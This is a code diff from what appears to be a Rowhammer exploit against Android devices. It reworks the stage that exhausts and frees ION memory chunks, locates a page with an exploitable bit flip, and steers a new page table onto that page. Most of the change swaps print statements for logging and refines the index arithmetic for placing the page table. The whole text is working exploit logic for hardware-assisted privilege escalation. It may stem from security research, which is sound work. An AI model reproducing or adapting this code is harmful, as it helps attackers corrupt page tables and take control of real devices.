@@ -318,9 +318,8 @@ int main(int argc, char *argv[]) {
             get_buddy_info();
 
             // Exhaust L
-            printf("[EXHAUST L] Exhaust L (4MB) ION chunks for templating\n");
             int count = ION_bulk(M(4), ion_chunks, 0);
-            print("[EXHAUST L] %d L (4MB) ION chunks allocated \n", count);
+            log_info("[EXHAUST L] %d L (4MB) ION chunks allocated", count);
             get_buddy_info();
 
             // Template L
@@ -329,54 +328,58 @@ int main(int argc, char *argv[]) {
             // check exploitable bits inside L
             struct template_t *first_expl = get_first_exploitable_flip(templates);
             if (first_expl == NULL) {
-                printf("[TMPL] - No exploitable flip found.\n");
+                log_warn("[TMPL] No exploitable flip found.\n");
                 continue;
             }
+            log_debug("[TMPL] Exploitable bit at va %p, pa %p", first_expl->virt_addr, first_expl->phys_addr);
+            log_debug("[TMPL] Index in page table: %d", first_expl->word_index_in_pt);
+            log_debug("[TMPL] Relative source PFN: %d", first_expl->source_pfn);
 
             // Exhaust M
-            printf("[EXHAUST M] Exhaust M (64KB) ION chunks\n");
             count = ION_bulk(K(64), ion_chunks, 0, false);
-            print("[EXHAUST M] %d M (64KB) ION chunks allocated \n", count);
+            log_info("[EXHAUST M] %d M (64KB) ION chunks allocated", count);
             get_buddy_info();
 
             // Free L* with particular exploitable bit
-            auto l_star_va = (uintptr_t) first_expl->ion_chunk->mapping;
-            print("[FREE L] Free L* at va %p\n", first_expl->ion_chunk->mapping);
-            print("[FREE L] Exploitable bit at va %p\n", first_expl->virt_addr);
+            log_info("[FREE L] Free L* at va %p", first_expl->ion_chunk->mapping);
             if (first_expl->virt_row == (uintptr_t)first_expl->ion_chunk->mapping) {
-                printf("[FREE L] - M* at edge of L*\n");
+                log_warn("[FREE L] M* at edge of L*");
                 continue;
             }
             ION_clean(first_expl->ion_chunk);
             get_buddy_info();
 
             // Immediately exhaust M again
-            printf("[EXHAUST M] Exhaust M (64KB) ION chunks again\n");
-            count = ION_bulk(K(64), ion_chunks, 0, false);
-            print("[EXHAUST M] %d M (64KB) ION chunks allocated \n", count);
+            count = ION_bulk(K(64), ion_chunks, 0, true);
+            log_info("[EXHAUST M] %d M (64KB) ION chunks allocated", count);
             if (count != 64) {
                 // M doesn't use free space of L*
-                log_warn("[EXHAUST M] - size mismatch");
+                log_warn("[EXHAUST M] Size mismatch");
                 continue;
             }
             get_buddy_info();
 
-//            // Prints 0xb690... to 0xb6cf (means that addresses in the vector is in reversed order
-//            count = 0;
-//            for (auto it = ion_chunks.rbegin(); it != ion_chunks.rend(); it++) {
-//                print("[MAIN] New M at va %p\n", (*it)->mapping);
-//                count++;
-//                if (count == 64) break;
-//            }
+            // va in the vector is in descending order
+            // pa in the vector is in ascending order
+            count = 0;
+            for (auto it = ion_chunks.begin() + ion_chunks.size() - 64; it != ion_chunks.end(); it++) {
+                log_debug("[MAIN] New M at va %p, pa %p", (*it)->mapping, get_phys_addr((uintptr_t)(*it)->mapping));
+                count++;
+                if (count == 3) break;
+            }
 
             // Free M* and all L
-            uint32_t m_star_idx = (first_expl->virt_row >> 16) - (l_star_va >> 16);
-            log_debug("m_star_idx = %u", m_star_idx);
-            ION_clean(ion_chunks.at(ion_chunks.size() - 1 - m_star_idx));
+            // Target M* chunk index in L (counts by number of M chunk / row)
+            uint32_t m_star_idx_l = first_expl->target_pfn_row;
+            // Source Mp chunk index in L
+            uint32_t m_p_idx_l = first_expl->source_pfn_row;
+            // Store Mp index in ion_chunks
+            uint32_t m_p_idx_chunks = ion_chunks.size() - 64 + m_p_idx_l;
+            log_debug("m_star_idx_l %u, m_p_idx_l %u", m_star_idx_l, m_p_idx_l);
+            ION_clean(ion_chunks.at(ion_chunks.size() - 64 + m_star_idx_l));
 
             for (auto chunk : ion_chunks) {
                 if (chunk->len == M(4)) {
-//                    print("[FREE L] Free %p, len %d\n", chunk->mapping, chunk->len);
                     ION_clean(chunk);
                 }
             }
@@ -391,35 +394,49 @@ int main(int argc, char *argv[]) {
                 log_warn("[EXHAUST S] More than one 64K holes");
                 continue;
             }
+            uint32_t s_num = 0;
             while (true) {
                 count = ION_bulk(K(4), ion_chunks, 1, false);
                 if (count == 0) break;
+                s_num++;
 
                 get_buddy_info("Normal", free);
                 if (free[4] != 1) {
-                    printf("[EXHAUST S] Meet 64K hole\n");
+                    log_debug("[EXHAUST S] Meet 64K hole");
                     break;
                 }
             }
+            log_debug("[EXHAUST S] %u S chunks allocated", s_num);
 
             // Allocate padding S until the next place will be vulnerable
-            uint32_t padding_num = (first_expl->virt_page - first_expl->virt_row) / PAGESIZE;
-            printf("[PADDING] %#x, %#x\n", first_expl->virt_page, first_expl->virt_row);
-            printf("[PADDING] Padding %u pages\n", padding_num);
-            if (padding_num != 0) ION_bulk(K(4), ion_chunks, padding_num - 1,false);
+            uint32_t padding_num = first_expl->target_page_index_in_row;
+            log_debug("[PADDING] %#x, %#x, %u", first_expl->virt_page, first_expl->virt_row, first_expl->target_page_index_in_row);
+            log_info("[PADDING] Need padding %u pages", padding_num);
+            if (padding_num > 1) ION_bulk(K(4), ion_chunks, padding_num - 1,false);
+            else if (padding_num == 0) {
+                log_warn("[PADDING] Vulnerable page at edge of M*");
+                continue;
+            }
 
             // Map appropriate p to allocate a new page table
             // Why 0xB6600000? See my script.
-            void *p = (void *)(0xB6600000 | first_expl->word_index_in_pt << 12);
+            log_debug("[MAP P] word_index_in_pt %d, source_page_index_in_row %u",
+                      first_expl->word_index_in_pt, first_expl->source_page_index_in_row);
+            void *va_m_with_p = (void *)(0xB6600000 | (first_expl->word_index_in_pt - first_expl->source_page_index_in_row) << 12);
+
             get_status_info("VmPTE");
-            void *q = mmap(p, K(4), PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-            printf("[MAP P] Map p at %p, got %p\n", p, q);
-            *(char *)q = 0xFF;
+            int ret = ION_mmap(ion_chunks.at(m_p_idx_chunks), -1, -1, va_m_with_p);
+            if (ret == -1) {
+                log_error("[MAP P] ION_mmap returns -1");
+                break;
+            }
+            log_debug("[MAP P] Map va_m_with_p at %p, got %p", va_m_with_p, ion_chunks.at(m_p_idx_chunks)->mapping);
+            log_debug("[MAP P] pa %p", get_phys_addr((uintptr_t)va_m_with_p + PAGE_SIZE * first_expl->source_page_index_in_row));
             get_status_info("VmPTE");
 
             break;
         } while(true);
-        log_info("[MAIN] Run %u time(s)", run_cnt);
+        log_info("[MAIN] Run %u time(s), all process done", run_cnt);
     }
 
     /*** CLEAN UP */
